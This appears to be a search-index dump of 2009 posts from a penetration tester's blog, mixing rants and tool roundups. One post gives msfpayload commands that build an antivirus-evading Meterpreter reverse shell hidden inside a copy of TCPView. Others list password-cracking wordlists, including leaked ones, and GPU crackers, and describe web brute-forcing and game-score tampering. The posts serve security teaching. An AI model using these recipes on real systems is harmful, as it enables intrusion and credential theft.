is mine (in no particular order): Number 1: iPhone compatible alarm clock with good sound Number 2: iPhone car mount that charges and is compatible with aux cables 32GB E-flash (esata, USB2.0) Drobo 4 bay backup solution The Tauntaun Sleeping Bag Griffin PowerMate Kindle DX or Barnes and Noble Nook Nokia N900 Roku HD-XR This Tesla or this one Canon EOS Rebel T1i Popcorn Hour Device (trumps the Roku) Logitech MX Revolution Logitech Harmony One The Art of Software Security Assessment by Mark Dowd Windows Internals 5 by Mark Russinovich and David Solomon Wi-Spy 2.4gz Spectrum Analyzer Hacker bumper sticker X-mini iHome Capsule Speakers Optimus Maximus Keyboard Sensitivity V Backpack Case of Bawls Turtle Beach Ear Force X41 Digital RF Wireless Gaming/Podcasting Headset ","date":"2009-12-03","objectID":"https://malicious.link/posts/2009/2009-12-03-2009-geek-christmas-list/:0:0","tags":null,"title":"2009 Geek Christmas List","uri":"https://malicious.link/posts/2009/2009-12-03-2009-geek-christmas-list/"},{"categories":["wishlist","internet"],"content":"What’s on your list? ","date":"2009-12-03","objectID":"https://malicious.link/posts/2009/2009-12-03-2009-geek-christmas-list/:1:0","tags":null,"title":"2009 Geek Christmas List","uri":"https://malicious.link/posts/2009/2009-12-03-2009-geek-christmas-list/"},{"categories":["infogathering","internet"],"content":"If you haven’t seen it all over twitter yet, achillean released the “beta” of SHODAN yesterday. It’s a search engine of basically a nmap of the internet (ports 21, 22, 23 or 80 so far). http://shodan.surtri.com/ You can search by keyword, and/or using any of the advanced search options. country: 2-letter country code hostname: full or partial host name net: IP range using CIDR notation (ex: 18.7.7.0/24 ) port: 21, 22, 23 or 80 Here is just a taste of the power this bring to the game: Let your mind run wild. I imagine this search engine will do nothing but grow. Remember, as with any service, your searches are happening on someone else’s servers, be gentle (it’s free.. right now) and be wary, you don’t want to put too much data about a customer ;-) Thanks go to HD Moore for the head up about the service, and Thierry Zoller for adding flame to the fire of crazy searches to try on this new service. ","date":"2009-11-24","objectID":"https://malicious.link/posts/2009/2009-11-24-shodan-the-computer-search/:0:0","tags":null,"title":"SHODAN The Computer Search","uri":"https://malicious.link/posts/2009/2009-11-24-shodan-the-computer-search/"},{"categories":["burp"],"content":"Idea came thanks to cktricky from: http://cktricky.blogspot.com/ A bunch of sites on the web give you different pages depending on the browser you use to view it. I know when I was a web developer compatibility was the bane of my existence, as I’m sure it still is for all the web devs out there. Well, sometimes this leads to bad coding practices, or even the old “Google Bot gets to see everything” feature. Well, I had an idea to take Burp’s Intruder and “Brute Force” any compatibility coding that a site may have. Especially if there is a restricted section of the page that you know is there, but don’t have access to. To start off you need a list of user agents. I pulled mine from the User-Agent Switcher lists I found on the web since they are in easily parsed XML. From: Qainsight’s UA Lists. I downloaded: http://qainsight.net/content/binary/AgentStrings20070517.xml There are plenty of ways to parse XML in your scripting language of choice but here is some dirty bash script that worked for me: cat AgentStrings20070517.xml | grep \"useragent=\" | grep -v \"*\" | awk -F '\"' '{print $4}' \u003e useragents.txt Next, we set up our Intruder instance: And import useragents.txt into Intruder and kick it off. If any of the ‘payloads’ come back with anything different, it’s definitely something to look into. ","date":"2009-11-19","objectID":"https://malicious.link/posts/2009/2009-11-19-brute-forcing-compatibility/:0:0","tags":null,"title":"Brute-Forcing Compatibility","uri":"https://malicious.link/posts/2009/2009-11-19-brute-forcing-compatibility/"},{"categories":["rant"],"content":"We (the security community) all know, and make fun of “Users”, and “Admins”. They are derogatory terms in our community. So much so, that they could almost be classified at curse words. (I can see the XKCD now: Security stick figure talking to IT stick figure. “You stupid A****”). While I neither discount their “contribution” to making my day fun, I feel that a lot of people miss an even bigger threat: Policies and Procedures, or SOP (Standard Operating Procedures). Those words are virtual kryptonite to anyone in IT, more so to ‘security professionals’. But what makes them a threat? Two thing: Everyone hates them so they are rarely updated (you know.. like Windows.. stay with me) Since they are rarely updated, and sometimes even those that are, are written poorly, or actually create vulnerabilities. For example lets make all the local admin passwords something really difficult and long, and… all the same so that we can easily administer every machine. This makes it to updates go smoothly and group policy… Oh wait… we don’t have those problems anymore (or at least they aren’t based on local authentication issues). Now, policies and documented procedures are good things. I’m not saying they aren’t. What I am saying is that when those documented procedures and policies that we blindly follow because the guy that trained me said so, just doesn’t cut it. Admins: Challenge that policy, find out the reason why you do what they want you to do. The worst that could happen is you could learn something new. The best is that you could change your company’s security posture for the better. Security Pros: Time to get off your A**** and update the wiki! (or the doc/site/binder) so that your predecessor, or someone new to your team can hit the ground running. I also challenge you to look at internet policies/procedures… oh wait.. they call those features. ","date":"2009-11-19","objectID":"https://malicious.link/posts/2009/2009-11-19-stop-blaming-the-admins/:0:0","tags":null,"title":"Stop blaming the admins!","uri":"https://malicious.link/posts/2009/2009-11-19-stop-blaming-the-admins/"},{"categories":["news"],"content":"Disclaimer: I was given a demo license of the new free business product to break/review. No money has traded hands. This is my brutally honest opinion of the product. I’ve played with a gambit of Astaro products, and personally I really hate UTMs, just like I do All-In-One Printer/Copier/Faxes. One thing breaks, they all do. However, Astaro’s .. before I go into my opinions of the product, or get on any soap box, here are the facts: Astaro Security Gateway was free for home use already * (works awesome for VM demos) On November 16th 2009, Astaro Security Gateway “Essential Firewall Edition” is now FREE to any business that wants to run a copy. * Essential Firewall Edition is basically a enterprise grade firewall w/ VPN and some reporting. Why I like this product is not because it’s Astaro, but because it’s the bare essentials. It’s exactly what a small to mid size business needs for you to stop getting calls from your friend at 5 AM asking why the Linksys you put DD-WRT on to be slick is down. There is no better gift you can give a business as an IT/Security guy, then the ability to see and log. Test it out, you’ll be amazed at what you see on your network. Like I said initially, this is a brutally honest post, and I whole heartedly believe in FREE, and one tool for one job. However so far it’s been all fluff and daisies. In coming posts, I’ll show how it, and other free alternatives break, or stand up from an attack point of view. On a site note, it works flawlessly with the iPhone ;-) - Use public wifi with no less fear, when all of your traffic is going through a VPN automagically. That’ll make the boss happy. ","date":"2009-11-18","objectID":"https://malicious.link/posts/2009/2009-11-18-a-simplified-astaro-utm-now-free-to-businesses/:0:0","tags":null,"title":"A Simplified Astaro UTM now FREE to businesses","uri":"https://malicious.link/posts/2009/2009-11-18-a-simplified-astaro-utm-now-free-to-businesses/"},{"categories":["internet","room362"],"content":"(This post got lost in the intertubes and it took a bit to get back, Archive.org nor Google cache had it) I get this question all the time: “Why room362.com?” I have answered that question in a lot of ways, depending on the perceived amount of time I had to tell the story. But, on a blog you have tons of time, right? Not if you are studying the Twitter boom. Anyways, this is the semi-brief-long version that won’t bore you to death like this intro is: It all started with a desk of multiplying pizzas… In 29 Palms, California, there is a Marine base. I was stationed there for a couple of months during some training and one night a group of us decided to stage a LANPARTY. Easier said than done when most of the Marines in the area were only there for a short while as well and didn’t want to bring desktops or chance laptops in the sandy dessert. But we pulled it off. We had about 8-10 players at any given time and people were playing everything from Quake3, to Lightbikes 2. And that was that, there really isn’t much excitement to be had in a dessert. However, there was one thing that the LAN party caused, an increased interest in how ‘domains’ worked in my room mate. He asked how to register a domain and I took him through the whole process, set up my dinky 1.4ghz Celeron laptop as a Windows 2003 server as a Domain Controller with Exchange 2003 installed on it (yes I know..). But he was stuck on choosing a name for the domain. Being the impatient person that I am, I got fed up and just named it the room number that we were staying in. And so Room362.com was born. 24 hours later, Room362.com was on every single RBL list for spammers on the planet. Why? Because there was at the time a default switch that made Exchange 2003 an open relay. Learned a lot that summer. Going forward it’s just been “my domain”, my room mate sure didn’t want it since it was “totally blocked from everything”. Been here ever since. Welcome to my room. Room362.com Logo in 2005: ","date":"2009-11-12","objectID":"https://malicious.link/posts/2009/2009-11-12-why-room362/:0:0","tags":null,"title":"Why Room362?","uri":"https://malicious.link/posts/2009/2009-11-12-why-room362/"},{"categories":["metasploit"],"content":"In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework. But before I get into the new feature, lets quickly go over the standard way you use msfencode: root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection. Now if you knew where it was (data/templates/template.exe) you could probably just replace the template.exe with the one you want loaded with the payload and called it a day. But then you wouldn’t get some of the tweaks that make this update awesome. The update added the (-x) option to msfencode. This allows you to specify an executable of your choosing to sacrifice to the gods. For example: (TCPView) root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -x /tmp/Tcpview.exe -o /tmp/Tcpview2.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart: ","date":"2009-11-03","objectID":"https://malicious.link/posts/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/:0:0","tags":null,"title":"Metasploit Blends in: New MSFPayload/ENcode","uri":"https://malicious.link/posts/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/"},{"categories":["internet"],"content":"Continuing my “Getting your fill of” series Dave Shackleford recently posted an excellent blog entry titled “One for the n00bs”: http://daveshackleford.com/?p=277 It relates the security community to a high school cafeteria. It’s a good read and pretty dead on. I want to echo his sentiments, “I got my OWN lunch table. And you’re invited.”, I”m just an email away. I also wanted to let you know there are a lot of places where you can learn on your own, at your own pace, and without any chance of ridicule. (well, maybe a little) In no particular order: Dan Guido’s Penetration Testing course at Poly U. This mind blowing set of videos (16 so far) are taught by the best in the biz. People pay out the nose for the information released in these videos. Get out your pen and paper, because the from the time you press play you are going to be inundated with technical knowledge. (On the Vimeo site for each video you can even download the full thing for viewing on your i(Phone|Pod|Touch|Brain)) PRICE: FREE SecurityTube A consolidation of all the security /hacking related videos posted to the net. Their database of videos is massive. PRICE: FREE The Academy Kinda like Security Tube, but these videos are all professionally done by Peter Giannoulis and crew, and are on some of the big iron security tools and appliances that you wouldn’t normally be able to get your hands on to play with. This is a great way to beef up your knowledge of a product that your potential employer is running (after you have cyber stalked them: http://www.irongeek.com/i.php?page=security/how-to-cyberstalk-potential-employers). Or you just want to find out what that Security guy from the other section installed in your rack. PRICE: FREE (just have to sign up for a free account) Metasploit Unleashed: Mastering the Framework by Offensive Security This is the official documentation for the Metasploit Framework. It’s scenario driven, so it’s really easy to follow along. PRICE: FREE (Videos and other materials are available for a donation to Hackers for Charity) And I wouldn’t be doing my duty without showing you how to get more: Vimeo search for Metasploit (you can even put it in your favorite feed reader): http://vimeo.com/videos/search:metasploit Pretty much any video site (youtube, blip.tv, viddler) plus searches for metasploit or hacking will net you a bunch of videos. You’ll have to sift through some trash, but there are definitely some nuggets out there. Vimeo just seems the most noise free at the moment. I hope this helps you at whatever stage you think you are at since we are all n00bs to an extent. Other “Getting your fill of” series posts: Getting your fill of Security Getting your fill of Reverse Engineering and Malware Analysis ","date":"2009-10-26","objectID":"https://malicious.link/posts/2009/2009-10-26-getting-your-n00b-fill-of-security/:0:0","tags":null,"title":"Getting your n00b fill of security","uri":"https://malicious.link/posts/2009/2009-10-26-getting-your-n00b-fill-of-security/"},{"categories":["novahackers"],"content":"I created a google group for the NoVA Hackers meetups (Formerly known as NoVASec Luncheons) I have added some permissions to the group to maximize privacy options while still allowing for interaction other than me sending out BCC’d messages to everyone: Private Invite Only - basically to keep spam out Only Managers can view Member List - so those who want don’t want their email addresses seen can join and just listen for announcements and regular message traffic Managers and Members can invite - this allows for growth by word of mouth with little moderation ( I say little because I’ll still get emails when new users join ) If you are interested in joining please send me the email addresses you would like invited to the group to mubix@hak5.org URL is http://groups.google.com/group/novahackers/ I will be doing all following announcements there. ","date":"2009-10-20","objectID":"https://malicious.link/posts/2009/2009-10-20-nova-hackers/:0:0","tags":null,"title":"NoVA Hackers","uri":"https://malicious.link/posts/2009/2009-10-20-nova-hackers/"},{"categories":["facebook","pragmatk","guestpost"],"content":"I had a bet with my friend about getting #1 on the Crazy Taxi high score page (== motivation for this post). For those who have not been introduced to it yet, it’s a Facebook/Flash/2.0 resurrection of a much older game. Not having extreme timing skills, I quickly gave up on getting the 2,000,000 points required to make it the “normal” way: My first try was modifying the outgoing HTTP traffic using the Tamper Data plugin for Firefox (to catch the obvious ones). The Crazy Taxi Flash does actually submit your score using HTTP in clear text (IIRC they have a reflected XSS there as well), but the GET-param is only used for displaying a score - nothing is saved. By the looks of things, they seem to be RC4-encrypting the score as some sort of weak client-side anti-tamper protection, and even though singling out the request that submitted the score was no pain at a all - it actually said “submitScore” - decompiling the Flash, however, was. At first I tried with flasm, but for some reason flasm went all bananas when confronted with the Crazy Taxi flash files, so I started sketching up a Flash / AS3 deobfuscator / decompiler with Frigolit - and then I realized that simply debugging the host process would be far the fastest way to do it. I started out with setting my score to “6661337”, but someone had “beat” it the day after. I wanted to be on top, and I didn’t want to have to “maintain” my position. I wanted the maximum score, so that made me look into matters and discover that the score was stored in a signed double (I think they use PHP ;). Here’s a video of me “achieving” 0x7fff ffff points. A nice little thing is that if you go above 0x7ffff ffff (\u003e=0x8000 0000), the sign will flip and your numbers will “shrink” instead of growing. Damn I would like to see the frustrated faces of all them other script kiddies when they sit at home, trying to raise their scores and getting minus values instead :-) Hacking Crazy Taxi from Joe Pragmatk on Vimeo. ","date":"2009-10-17","objectID":"https://malicious.link/posts/2009/2009-10-17-hacking-crazy-taxi/:0:0","tags":null,"title":"Hacking Crazy Taxi","uri":"https://malicious.link/posts/2009/2009-10-17-hacking-crazy-taxi/"},{"categories":["internet","rant"],"content":"Yes, I just called everyone who works at Apple an Oompa Loompa, but I digress: I was reading Brooke Crothers’ story on the Apple ‘gag’ order [1] and couldn’t help but think of how Apple has created an almost similar situation. Everyone wants to know what Apple is up to, can’t stop talking about it. Buzz Out Loud [2] even had people call and email asking them to see if they could do a show without mentioning Apple or the iPhone. According to Brooke’s article, people are afraid for their very jobs (pun?) even in the mentioning of Apple. What’s behind the curtains at Apple? Is Steve Jobs going to send out 5 golden Apple Tablets? Probably not, but I can’t shake the image of Steve coming out on stage to do one of his presentations with a cane and doing a fake fall to the podium. So I pose this crucial question to you, the reader: Who plays the part of Slugworth? [1] http://news.cnet.com/8301-13924_3-10372535-64.html?part=rss\u0026subj=news\u0026tag=2547-1_3-0-20 [2] http://bol.cnet.com ","date":"2009-10-12","objectID":"https://malicious.link/posts/2009/2009-10-12-apple-a-modern-day-willy-wonka-story/:0:0","tags":null,"title":"APPLE: A Modern Day Willy Wonka Story","uri":"https://malicious.link/posts/2009/2009-10-12-apple-a-modern-day-willy-wonka-story/"},{"categories":["rant"],"content":"I’ve been debating making this kind of post for about a week, and I apologize for the RSS spam. But it was getting a bit repetitive telling people via DM, email or other communication what happened. When I took my hiatus from Twitter, I zero’d out my followers, so, if you care to, please check to see if you are still following me. I will be watching my follows closely and will refollow people I might have missed in my initial run through. http://twitter.com/mubix Thanks, Rob ","date":"2009-10-11","objectID":"https://malicious.link/posts/2009/2009-10-11-back-on-twitter/:0:0","tags":null,"title":"Back on Twitter","uri":"https://malicious.link/posts/2009/2009-10-11-back-on-twitter/"},{"categories":["burp","nikto"],"content":"CKTricky over at http://cktricky.blogspot.com has been running an awesome Burp Tip of the Day series on his blog. After seeing him use Nikto through Burp. I decided to see if I could just export the list of checks to a text file so that I could use them over and over in Intruder. After a bit of awk and sed hell I figured it out, and submited it to him for acceptance to his BTotD series. Yesterday it was posted ;-) Here: http://cktricky.blogspot.com/2009/10/btod-importing-nikto-db-to-intruder.html Here is the ugly command I came up with: cat /pentest/web/nikto/plugins/db_tests | awk -F \",\" '{print $4}' | sed 's/^\"*//;s/\"$//' | sed 's/^@CGIDIRS//;s/@ADMIN//;s/^@NUKE//;s/^@POSTNUKE//;s/^@PHPMYADMIN//' | sed 's/^///' \u003e ~/nikto_burp.txt1 What you are sacrificing here are the checks for the CGIDIRS, ADMIN, NUKE, POSTNUKE, and PHPMYADMIN interfaces. Personally, I’ve modified this script a bit, but you can modify it how best fits your tests: cat /pentest/web/nikto/plugins/db_tests | awk -F \",\" '{print $4}' | sed 's/^\"*//;s/\"$//' | sed 's/^@CGIDIRS/cgi-bin//;s/@ADMIN//;s/^@NUKE//;s/^@POSTNUKE//;s/^@PHPMYADMIN/phpMyAdmin//' | sed 's/^///' \u003e ~/nikto_burp.txt So that I could cover at least the most common cgi and phpmyadmin directories ","date":"2009-10-10","objectID":"https://malicious.link/posts/2009/2009-10-10-burp-tip-of-the-day-nikto-db-import/:0:0","tags":null,"title":"Burp Tip of the Day - Nikto db import","uri":"https://malicious.link/posts/2009/2009-10-10-burp-tip-of-the-day-nikto-db-import/"},{"categories":["metasploit","meterpreter"],"content":"So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video. Metasploit meterpreter Windump/Winpcap sniffer from siles on Vimeo. ","date":"2009-10-03","objectID":"https://malicious.link/posts/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/:0:0","tags":null,"title":"Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish","uri":"https://malicious.link/posts/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/"},{"categories":["internet"],"content":"The site has been down for a while, there were a lot of factors that played into that, but mostly it was focus on some family, as I had some in town. I also came to the conclusion that it’s time to move to “the cloud” so I moved over to SquareSpace (using the coupon code: DEFCON \u003c/end shameless plug\u003e). I have an actual web designer looking at hooking this thing up right. Also, I wanted to ask if anyone was interested in becoming a writer for Room362, opening it to more people to contribute to the content here. Shoot me an email: mubix@hak5.org or one of the other ones I have on the net and we’ll work something out. Thanks, and see you around the net. Rob ","date":"2009-10-01","objectID":"https://malicious.link/posts/2009/2009-10-01-squarespace-new-design-and-call-for-contributors/:0:0","tags":null,"title":"SquareSpace, New Design and Call for Contributors","uri":"https://malicious.link/posts/2009/2009-10-01-squarespace-new-design-and-call-for-contributors/"},{"categories":["cracking","wordlists"],"content":"Brute force, even though it’s gotten so fast, is still a long way away from cracking long complex passwords. That’s were word lists come in handy. It’s usually the crackers first go-to solution, slam a word list against the hash, if that doesn’t work, try rainbow tables (if they happen to have the tables for that specific hash type), and then the full on brute force. Some would say those first two steps are reversed, and it really is the choice of the the person doing it and the word lists they have to work with. Matt Weir and company created a cool tool that has the best of both worlds, Dictionary based Rainbow Tables with Dr-Crack, which you can find here: http://reusablesec.googlepages.com/drcrack But, back to the reason of this post, word lists. Where do you get them? Here are a couple of my favorite places in no particular order: http://www.packetstormsecurity.org/Crackers/wordlists/ http://www.theargon.com/achilles/wordlists/ http://www.openwall.com/wordlists/ http://www.outpost9.com/files/WordLists.html I like to keep 3 size word lists: small and fast: usually based on the output of one of the tools i’m about to tell you about medium: this is my custom list that I add passwords I find / crack and generally think are good to add. I’m pretty picky about what goes into this list huge: any wordlist I come across gets added to this list, it gets sorted and uniqued and restored Now the two tools that I like for the small list is are CeWL and wyd CeWL - http://www.digininja.org/projects/cewl.php Wyd - http://www.remote-exploit.org/codes_wyd.html They have some very similar lists of features, your mileage may vary. But they basically parse files and web pages for words and generate password lists based on the words found. Update on 2011-02-11 08:01 by Rob Fuller Korelogic’s password lists: http://contest.korelogic.com/wordlists.html Korelogic’s John rule set: http://contest.korelogic.com/rules.html Update on 2010-03-30 05:00 by Rob Fuller I missed one hell of a treasure trove of word lists: http://trac.kismac-ng.org/wiki/wordlists Right now, there list is this: ","date":"2009-09-18","objectID":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/:0:0","tags":null,"title":"Password / Word lists","uri":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/"},{"categories":["cracking","wordlists"],"content":"OpenWall: http://ftp.sunet.se/pub/security/tools/net/Openwall/wordlists/ ftp://ftp.openwall.com/pub/wordlists/ http://www.openwall.com/mirrors/ http://passwordz.info/ ftp://ftp.ox.ac.uk/pub/wordlists/ http://gdataonline.com/downloads/GDict/ http://theargon.com/achilles/wordlists/ http://theargon.com/achilles/wordlists/theargonlists/ ftp://ftp.cerias.purdue.edu/pub/dict/ http://www.outpost9.com/files/WordLists.html http://www.securinfos.info/wordlists_dictionnaires.php http://www.vulnerabilityassessment.co.uk/passwords.htm http://packetstormsecurity.org/Crackers/wordlists/ http://www.ai.uga.edu/ftplib/natural-language/moby/ http://www.insidepro.com/eng/download.shtml http://www.word-list.com/ http://www.cotse.com/tools/wordlists1.htm http://www.cotse.com/tools/wordlists2.htm http://www.phreak.org/index/archive01/hacking/wordlsts/wordlsts.shtml http://www.indianz.ch/tools/doc/wordlists.zip http://wordlist.sourceforge.net/ http://prdownloads.sourceforge.net/wepattack/wordlist.tar.gz?download http://hacor.org/docs/hugelist.txt (broken link. Does anyone have it hosted elsewhere?) shhh! - /projects/hugelist.txt ","date":"2009-09-18","objectID":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/:1:0","tags":null,"title":"Password / Word lists","uri":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/"},{"categories":["cracking","wordlists"],"content":"By operat0r http://rapidshare.com/files/165513464/word.lst.s.u.john.s.u.200.part01.rar http://rapidshare.com/files/165518143/word.lst.s.u.john.s.u.200.part02.rar http://rapidshare.com/files/165498510/word.lst.s.u.john.s.u.200.part03.rar http://wiki.services.openoffice.org/wiki/Dictionaries http://article7.org/wordlists/ Update on 2010-03-30 04:22 by Rob Fuller Recent additions: http://www.skullsecurity.org/wiki/index.php/Passwords hotmail: http://current.com/technology/91108676_email-password-leak-update-gmail-yahoo-aol-and-hotmail-hit-too.htm rockyou: http://securitystream.info/data-breaches/easy-passwords-found-in-rockyou-data-leak/ http://wordlist.sourceforge.net/ (Kevin’s Word Lists) http://www.phenoelit-us.org/dpl/dpl.html http://www.offensive-security.com/wpa-tables/wpalist.txt.tar.bz2 http://www.renderlab.net/projects/WPA-tables/ ","date":"2009-09-18","objectID":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/:2:0","tags":null,"title":"Password / Word lists","uri":"https://malicious.link/posts/2009/2009-09-18-password-word-lists/"},{"categories":["cuda","cracking"],"content":"I recently upgraded my video card and had a rough time finding programs that fit the hype of GPU password cracking, so here is what I found so that you won’t have as hard a time. Ivan Golubev’s SHA1/MD5/MD4 cracker: http://www.golubev.com/hashgpu.htm Ivan Golubev’s RAR pass cracker: http://www.golubev.com/rargpu.htm CUDA Multiforcer (down at the time of this posting) http://www.cryptohaze.com/bruteforcers.php BarsWF - MD5 Cracker: http://3.14.by/en/md5 GPU MD5 Crack: (Included in BackTrack 4 repos “gpu-md5-crack”) http://bvernoux.free.fr/md5/index.php Distributed Hash Cracker: http://rpisec.net/projects/show/hash-cracker \" This is an interesting one as it has a PHP front end and is agent based, so you can use one or a dozen computers, and it will use the CPUs and GPUs available\" Pentoo Live CD with a bunch of GPU cracking goodness built in: http://pentoo.blogspot.com/ Extreme GPU Bruteforcer (39.95 Euro) http://www.insidepro.com/eng/egb.shtml ElcomSoft Distributed Password Recovery ($599 for 1st lvl - 20 hosts) http://www.elcomsoft.com/edpr.html ax0n from http://www.h-i-r.net/ shot me an email stating that BT4 has some more GPU tools added to it: Just FYI, BT4 also added some CUDA GPU cracking functionality a while back ago. IIRC It includes Pyrit and CUDA-Multiforcer – maybe a few others. Pyrit is a cuda-enabled WPA-PSK cracker that you may also be interested in. Pyrit - WPA/PSK - WPA2/PSK GPU cracker http://code.google.com/p/pyrit/ ","date":"2009-09-18","objectID":"https://malicious.link/posts/2009/2009-09-18-gpu-hash-password-cracking/:0:0","tags":null,"title":"GPU Hash / Password Cracking","uri":"https://malicious.link/posts/2009/2009-09-18-gpu-hash-password-cracking/"},{"categories":["rant"],"content":"Update I can’t say with 100% certainty that Nessus ever used NMAP as it’s base scanner, I was going off of memory. I apologize for not being perfect. Update 2 Since people can’t seem to let it go, I would say that I was totally wrong and the nmap was absolutely never used in nessus ever, but then I would be caught in another absolute that I can’t confirm. According to their wiki, the nmap nasl script were taken out because people were No, I haven’t listened to the latest episode of Securabit in which Paul comes on and talks about Nessus. If he states in there that nmap was never the port scanning engine for nessus, then please go bug him if you think he is wrong. Update 3 Ron Gula of Tenable has confirmed via email that Nessus has never used nmap as it’s base scanner. Also, Attrition.org posted a bit of history on the subject: http://attrition.org/misc/ee/nessus_and_nmap.html On Securabit Episode 37 - I made the statement that some people could be running nmap and not even know it. While this could still hold true, the context I put around it. “Nessus uses nmap for scanning” showed my years a bit. That statement is now a falsehood. Nessus uses it’s own “optimized” port scanner. I put quotes around the word “optimized” simply because I don’t know what tweaks that have been done. Paul Asadorian from PaulDotCom Security Weekly sent an email into Securabit letting us know of the error. I didn’t take the news very gallantly, but Paul was nice enough to lay out how someone would go about using nmap with Nessus these day. Those steps are pretty drawn out too, which I find kinda disheartining that not only do you not have nmap as your base port scanner, but the NASL scripts to use nmap are no longer included in the base install of Nessus (according to Paul, I haven’t confirmed that, but he does work for the company). And who knows why they decided to leave those script out, but you will have your chance to ask those questions because Paul will be on Securabit LIVE tonight to tie up any loose ends and talk about Nessus tonight at 8 PM EST (September 16th 2009). For more info about tonight’s show: http://www.securabit.com/2009/09/15/securabit-live-wednesday-with-paul-asadoorian-from-pauldotcom/ ","date":"2009-09-16","objectID":"https://malicious.link/posts/2009/2009-09-16-corrections-and-questions-about-nessus-on-securabit/:0:0","tags":null,"title":"Corrections and Questions about Nessus on Securabit","uri":"https://malicious.link/posts/2009/2009-09-16-corrections-and-questions-about-nessus-on-securabit/"},{"categories":["pass the hash"],"content":"Here is a quick no nonsense PTH video I made for the guys over at SecurityAegis Music is Scott Brown’s contribution to the Happy 2b Hardcore Chapter Four album called “Elysium” ","date":"2009-08-26","objectID":"https://malicious.link/posts/2009/2009-08-26-pass-the-hash-metasploit-demo/:0:0","tags":null,"title":"Pass the Hash Metasploit Demo","uri":"https://malicious.link/posts/2009/2009-08-26-pass-the-hash-metasploit-demo/"},{"categories":["rant"],"content":"Per the best of the best in presenting, what breeds a good presentation slide deck? Simplicity I want to pose a statement. “Simplicity is Security”. The reason I say this is that this day in age, at least in the US, ‘convenience’ is king. And we try to protect those conveniences with ‘security’. Let me start over a bit, this train of thought all started when I started to explain the insecurities in WiMAX to my wife. We saw a WiMAX device that plugged straight into your computer. I told her this was bad because by connecting to this you have no barrier between you and the ‘bad guys’ other than possibly the Windows Firewall. Her answer surprised me. ‘So?’ is all she said. Japan doesn’t use ‘Check Cards’ or even really credit cards for that matter. To get such a card you need to go through a book worth of paper work, so it’s just not ‘convenient’ for most people, so they don’t get them. So guess what? They don’t bank online, and they don’t buy stuff online. I racked my brain to figure out what possibly could be on her computer that a ‘bad guy’ would want. I couldn’t think of anything (maybe you can). The government relies on paper backups of anything electronic (so they hardly make electronic versions). Signatures are based on stamps that are difficult to copy. The worst a hacker could do on her computer is use it as a zombie, and even then, their ISPs detect and disconnect excessive use. Where did we as “Security Professionals” go wrong? Was it the fat paychecks we wanted? Was it the fear of the ‘underground’? Reality seems to dictate that we will continue on this path from the analog to the digital, from paper and clerks to networks and AI. The question I want to ask you though is; Should we continue down the path of “MORE SECURITY” or should we deviate a bit for simpler, possibly non-technical practices? In these last two posts you may assume that I favor the Japanese culture and way of life over a US one. You would be mistaken, I simply learn, take the best parts of what I learn, and try to apply them where I can. Learning from others triumphs and defeats, strengths and weaknesses is a basic human function that we a humanoids should embrace. ","date":"2009-08-13","objectID":"https://malicious.link/posts/2009/2009-08-13-simplicity-is-security/:0:0","tags":null,"title":"Simplicity is Security","uri":"https://malicious.link/posts/2009/2009-08-13-simplicity-is-security/"},{"categories":["rant"],"content":"I recently visited Tokyo, Japan. Just as always, my curiosity got the best of me and I started to calculate the population density of the buildings where I was staying. Giving fudge factor of non-populated apartments, I estimated 8,500 families in twelve 15 story buildings, living in a 1.5 mile square piece of land.That’s CRAZY. Mass transit and unrestricted modes of transit are not a whim, they are a requirement. I bet you’re asking how this applies to security, or for that matter computers at all. It doesn’t. But one of it’s effects does. As an effect of this density, the Mom \u0026 Pap stores businesses flourish. In it’s density, the “big iron” is just too inconvenient, it doesn’t work. I used the reference for a reason. It was my own mental bridge between the “real” and security world (anyone who denies the difference is confused, and/or just left DefCon). What is the “Big Iron” in the security world? Central management, Correlation, and other ways of supposedly spending “less” on security by having less points of failure. So this is where I stray from the path. I think that networks need to mimic their worldly equivalent. Large organizations need to take an page from Tokyo and decentralize. Yes, it’s hard getting ‘good’ people, and trust is not something we easily come by in this industry, but from an offensive point of view, centralization just means a bigger payoff. Higher walls, maybe, but an ’easier’ target to zero in on. So what does this mean? I eluded to it a bit in my previous paragraph, but what it means is more hands on. We need to train the ‘security guards’ of our network and put them at every location we have a grouping of nodes. The smaller the grouping of nodes the better. VLANs are not enough. I’m going to use the the dreaded “Defense in Depth” phrase: We need to make our defense in depth smaller, more compact. Make it to the point where you don’t NEED “Big Iron” because you have such small perimeters that open source stuff on an old *nix box would work just fine. Yes, that’s a bit of an exaggeration but you get the point. Every city is different and unique, as is any network, and I am by no means saying that decentralization is for everyone. What I do think is that big organizations are getting too hung up on devices and one stop shops where they can set up a NOC and expect a number, however many, of people to be able to watch everything going on. Exactly the way that corporations lose touch with their employees because of their size, they are loosing touch with their network and how it works. How many places have you worked that they have a good diagram of nodes (not just subnets) on their network? Much less documentation on those nodes. How exactly are you supposed to centrally monitor something you have very little knowledge of? Will it take as many years as it did with personnel to reconnect with the life of the network? Probably, but I hope not. As always, I am open to debate and hearing about flaws in my logic, so please leave a comment and tell me what you think. 